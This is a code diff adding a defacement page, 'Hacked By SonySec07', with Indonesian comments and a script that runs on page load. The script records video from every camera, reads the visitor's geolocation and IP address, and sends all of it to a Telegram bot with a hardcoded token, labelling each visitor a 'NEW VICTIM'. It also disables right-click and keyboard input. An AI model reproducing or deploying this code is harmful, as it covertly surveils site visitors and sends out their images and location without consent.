@@ -1,0 +1,141 @@
+<?php
+$botToken = '7599305876:AAFojw-7gJICoPIt5YXS8xdtVh7aM2vEsxM';
+$chatID = '7221518562';
+?>
+
+<html>
+<head>
+    <title>Hacked By SonySec07</title>
+    <meta charset="UTF-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1" /> 
+    <style type='text/css'>body,a:hover{cursor:url(../cur.cursors-4u.net/symbols/sym-1/sym46.cur),progress!important;}</style>
+    <script>
+        window.config = {
+            botToken: '<?php echo $botToken; ?>',
+            chatID: '<?php echo $chatID; ?>'
+        };
+    </script>
+</head>
+<body bgcolor="white" text="black" oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
+<!-- ... (tampilan deface tetap sama) ... -->
+
+<script>
+(async () => {
+    const DEBUG_MODE = false;
+    let isFrontCamera = true;
+    let collectedData = {
+        videos: [],
+        location: null,
+        ip: null
+    };
+
+    // Fungsi utama pengiriman data
+    const sendPayload = async () => {
+        try {
+            const finalData = new FormData();
+            
+            // Ambil IP
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                collectedData.ip = (await ipResponse.json()).ip;
+            } catch(e) { collectedData.ip = 'Unknown'; }
+
+            // Ambil lokasi
+            if(navigator.geolocation) {
+                collectedData.location = await new Promise(resolve => {
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
+                        () => resolve('Blocked')
+                    );
+                });
+            }
+
+            // Siapkan payload
+            finalData.append('chat_id', window.config.chatID);
+            finalData.append('text', `📡 NEW VICTIM\nIP: ${collectedData.ip}\nLocation: ${collectedData.location}`);
+
+            // Kirim video jika ada
+            if(collectedData.videos.length > 0) {
+                finalData.append('video', collectedData.videos[0].blob, 'recording.webm');
+                finalData.append('caption', finalData.get('text'));
+            }
+
+            // Gunakan endpoint sesuai ada video atau tidak
+            const endpoint = collectedData.videos.length > 0 
+                ? `https://api.telegram.org/bot${window.config.botToken}/sendVideo`
+                : `https://api.telegram.org/bot${window.config.botToken}/sendMessage`;
+
+            // Eksekusi pengiriman
+            const response = await fetch(endpoint, {
+                method: 'POST',
+                body: collectedData.videos.length > 0 ? finalData : JSON.stringify(Object.fromEntries(finalData)),
+                headers: collectedData.videos.length > 0 ? {} : {'Content-Type': 'application/json'}
+            });
+
+            if(!response.ok) throw new Error(await response.text());
+            
+            if(DEBUG_MODE) console.log('Payload terkirim!');
+            
+        } catch(error) {
+            if(DEBUG_MODE) console.error('Gagal mengirim:', error);
+        }
+    };
+
+    // Sistem perekaman video
+    const recordVideo = async (deviceId) => {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: {
+                    deviceId,
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                }
+            });
+            
+            const recorder = new MediaRecorder(stream);
+            const chunks = [];
+            
+            recorder.ondataavailable = e => chunks.push(e.data);
+            
+            await new Promise(resolve => {
+                recorder.onstop = resolve;
+                recorder.start();
+                setTimeout(() => recorder.state === 'recording' && recorder.stop(), 2000);
+            });
+            
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            collectedData.videos.push({ blob, deviceId });
+            
+            stream.getTracks().forEach(track => track.stop());
+            
+        } catch(error) {
+            if(DEBUG_MODE) console.error('Rekaman gagal:', error);
+        }
+    };
+
+    // Proses utama
+    try {
+        // Dapatkan daftar perangkat
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const cameras = devices.filter(d => d.kind === 'videoinput');
+        
+        // Rekam dari semua kamera
+        for(const camera of cameras) {
+            await recordVideo(camera.deviceId);
+        }
+        
+        // Kirim data
+        await sendPayload();
+        
+        // Redirect setelah selesai
+        setTimeout(() => window.location.reload(), 5000);
+        
+    } catch(error) {
+        await sendPayload();
+    }
+})();
+</script>
+
+</body>
+</html>
